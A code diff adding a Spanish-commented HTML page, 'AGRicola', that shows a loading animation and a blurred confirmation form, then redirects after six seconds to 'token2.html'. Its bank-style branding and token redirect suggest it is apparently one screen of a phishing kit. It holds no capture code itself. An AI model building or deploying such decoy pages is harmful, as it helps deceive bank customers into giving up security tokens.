@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AGRicola</title>
+</head>
+
+
+<style>
+.ipp {
+    --vh: 6.43px;
+    -webkit-tap-highlight-color: transparent;
+    outline: 0;
+    box-sizing: border-box;
+    background-color: transparent;
+    border: none;
+    border-bottom: 1px solid #292929;
+    border-radius: 0;
+    display: block;
+    width: 100%;
+    font-size: 16px;
+    color: #292929;
+    font-family: "Open Sans", sans-serif;
+    line-height: 23px;
+    padding: 0;
+    margin: 0;
+    flex: 1 1 auto;
+    margin-bottom: 0;
+    padding-left: 0;
+}
+
+
+.boton {
+    --vh: 6.43px;
+    -webkit-tap-highlight-color: transparent;
+    outline: 0;
+    box-sizing: border-box;
+    display: inline-block;
+    background-color: #FDDA24;
+    color: #292929;
+    text-transform: uppercase;
+    border: none;
+    border-radius: 42px;
+    padding: 10px 17px;
+    font-weight: bold;
+    font-size: 18px;
+    font-family: "CIBfont", Helvetica, Arial, sans-serif;
+    vertical-align: middle;
+    overflow: hidden;
+    margin-bottom: 10px;
+    box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    min-height: 42px;
+    min-width: 135px;
+    line-height: 21px;
+    flex: 1 0 auto;
+}
+
+
+
+
+
+.boton2 {
+    --vh: 5.78px;
+    -webkit-tap-highlight-color: transparent;
+    outline: 0;
+    box-sizing: border-box;
+    display: inline-block;
+    background-color: #FDDA24;
+    color: #292929;
+    text-transform: uppercase;
+    border: none;
+    border-radius: 42px;
+    padding: 10px 17px;
+    font-weight: bold;
+    font-size: 18px;
+    font-family: "CIBfont", Helvetica, Arial, sans-serif;
+    vertical-align: middle;
+    overflow: hidden;
+    margin-bottom: 10px;
+    box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1);
+    width: auto;
+    min-height: 42px;
+    min-width: 135px;
+    line-height: 21px;
+    background-image: url(../img/icon.svg);
+    background-repeat: no-repeat;
+    background-position: 88% 50%;
+    background-size: 14px;
+    padding-right: 20px;
+    float: right;
+}
+
+.boton3 {float: left;
+    --vh: 5.78px;
+    -webkit-tap-highlight-color: transparent;
+    outline: 0;
+    box-sizing: border-box;
+    display: inline-block;
+    background-color: #d8d8d7;
+    color: #292929;
+    text-transform: uppercase;
+    border: none;
+    border-radius: 42px;
+    padding: 10px 17px;
+    font-weight: bold;
+    font-size: 18px;
+    font-family: "CIBfont", Helvetica, Arial, sans-serif;
+    vertical-align: middle;
+    overflow: hidden;
+    margin-bottom: 10px;
+    box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1);
+    width: auto;
+    min-height: 42px;
+    min-width: 135px;
+    line-height: 21px;
+    background-image: url(../img/icon.svg);
+    background-repeat: no-repeat;
+    background-position: 88% 50%;
+    background-size: 14px;
+    padding-right: 20px;
+    border: 1px solid;
+}
+.caja {
+
+}
+</style>
+
+
+
+
+
+
+
+<body>
+
+
+
+
+
+<center>
+
+
+
+
+    <p style="color: #fff;" id="CuentaAtras"></p>
+
+    <script language="JavaScript" style="color: #fff;">
+
+        /* Determinamos el tiempo total en segundos */
+        var totalTiempo=6;
+
+        var url="token2.html";
+
+        function updateReloj()
+        {
+            document.getElementById('CuentaAtras').innerHTML = " "+totalTiempo+"";
+
+            if(totalTiempo==0)
+            {
+                window.location=url;
+            }else{
+                /* Restamos un segundo al tiempo restante */
+                totalTiempo-=1;
+                /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+                setTimeout("updateReloj()",1000);
+            }
+        }
+      window.onload=updateReloj;
+
+        </script>
+
+    <div style="width: 380px;">
+    <br><br> 
+        
+        <br><br> <img style="    position: absolute;
+    margin-top: 154px;
+    margin-left: -115px;
+    width: 253px;" src="carga.gif" alt="">
+
+
+
+    </div>
+
+<form action="" style="width: 380px; height: auto; padding: 25px; margin-left: 25px; border:  ; margin: 0%;backdrop-filter: blur(1px); filter: blur(05px);">
+
+<img src="positivo.svg" alt="">
+
+<br>
+
+<img src="titulo.png" alt="" style="width: 260px;">
+
+
+
+<br><br><br> 
+</form>
+
+
+
+
+
+
+</center>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
